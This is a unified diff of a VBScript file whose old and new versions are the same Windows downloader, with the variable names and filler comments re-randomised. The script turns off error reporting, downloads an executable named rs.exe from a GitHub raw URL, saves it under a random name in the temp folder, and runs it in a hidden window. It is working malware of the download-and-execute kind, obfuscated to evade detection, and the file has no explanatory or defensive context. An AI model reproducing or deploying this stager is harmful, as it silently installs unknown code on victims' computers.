@@ -1,25 +1,25 @@
-' eUfQIklQHlWntxPOoMnaoSkMeWypjjikN
+' ApcvIOuXwUGUKJMrbKDEtuvZrhtapWBxSnmjgPeNgeEnGCfYsYM
 On Error Resume Next
-' ppyIeMnXlZmGNkQtXoGVhgTWlzroqDtfcFLazShOnGDDPlVAnoZtr ErVRBl
-Dim xfkrgae,yrpmajj,zruxyr,ajnwnl,bkwkcjo,cbzgje
-' ZExvvEvFbsdmEyMINbHPflSQEwHJbLyLTrSdfemcYQQCpJV
-Set xfkrgae = CreateObject("MSXML2.ServerXMLHTTP")
-xfkrgae.Open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
-xfkrgae.Send
-' FEksiTRbHlClqPTVyctSOMOJEHiWO
-If xfkrgae.Status = 200 Then
-  Set yrpmajj = CreateObject("ADODB.Stream")
-  yrpmajj.Type = 1
-  yrpmajj.Open
-  yrpmajj.Write xfkrgae.ResponseBody
-  Set zruxyr = CreateObject("Scripting.FileSystemObject")
-  ajnwnl = zruxyr.GetSpecialFolder(2)
-  bkwkcjo = ajnwnl & "\BezOvSEC.exe"
-  yrpmajj.SaveToFile bkwkcjo, 2
-  yrpmajj.Close
-  Set cbzgje = CreateObject("WScript.Shell")
-  cbzgje.Run bkwkcjo, 0, False
+' ekrkHYnElNUeWCWNypHeFNfCdBFZx
+Dim xvfqvuh,ybaglop,zvmdnt,audojr,bwolwid,crijha
+' AQJYmgljObPwLQusiuNXjVy
+Set xvfqvuh = CreateObject("MSXML2.ServerXMLHTTP")
+xvfqvuh.Open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
+xvfqvuh.Send
+' kwCOYsTNBJqHYhkgaNItTmRmPOC
+If xvfqvuh.Status = 200 Then
+  Set ybaglop = CreateObject("ADODB.Stream")
+  ybaglop.Type = 1
+  ybaglop.Open
+  ybaglop.Write xvfqvuh.ResponseBody
+  Set zvmdnt = CreateObject("Scripting.FileSystemObject")
+  audojr = zvmdnt.GetSpecialFolder(2)
+  bwolwid = audojr & "\8eRBskkt.exe"
+  ybaglop.SaveToFile bwolwid, 2
+  ybaglop.Close
+  Set crijha = CreateObject("WScript.Shell")
+  crijha.Run bwolwid, 0, False
 End If
-' MWJdqMkBVUgxkXZCPPqx
-Set xfkrgae = Nothing
-' SUVbVgTxScJcqBmgLrgqHztJpcfDzZ
+' paPAcDAXdajPHDIugykcuJZqlZcxfOqnIKYcQEJUGztfO fJYu
+Set xvfqvuh = Nothing
+' QFDWXuZmGihWsxoYzsjWvqkpauNAgGyTZ  ale
